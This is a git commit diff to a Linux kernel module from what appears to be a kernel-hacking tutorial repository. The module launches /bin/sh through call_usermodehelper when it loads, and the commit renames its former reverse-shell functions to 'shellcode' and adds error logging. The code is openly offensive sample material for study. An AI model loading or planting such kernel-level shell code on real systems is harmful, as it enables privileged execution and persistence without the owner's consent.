e82457cb82bc0439454e33ea923c6fdecd128a8b
cocomelonc <cocomelonkz@gmail.com>
2025-04-24 12:49:12 +0300

    test kernel hacking: local shellcode

--- 09-linux-android/01-linux-hacking-kernel/hack2.c
+++ 09-linux-android/01-linux-hacking-kernel/hack2.c
@@ -11,22 +11,27 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("cocomelonc");
 MODULE_DESCRIPTION("shellcode exec kernel module");
 
-static int __init reverse_shell_init(void) {
+static int __init shellcode_init(void) {
   // run shell
   char *argv[] = {"/bin/sh", NULL};
   char *envp[] = {NULL};
 
-  printk(KERN_INFO "Starting reverse shell...\n");
+  printk(KERN_INFO "starting shellcode...\n");
 
   // execve from user space
-  call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_PROC);
+  int ret = call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_PROC);
+  if (ret == 0) {
+    printk(KERN_INFO "shellcode launched successfully\n");
+  } else {
+    printk(KERN_ERR "failed to start shellcode. error code: %d\n", ret);
+  }
 
   return 0;
 }
 
-static void __exit reverse_shell_exit(void) {
-  printk(KERN_INFO "Reverse shell module unloaded\n");
+static void __exit shellcode_exit(void) {
+  printk(KERN_INFO "shellcode module unloaded\n");
 }
 
-module_init(reverse_shell_init);
-module_exit(reverse_shell_exit);
+module_init(shellcode_init);
+module_exit(shellcode_exit);
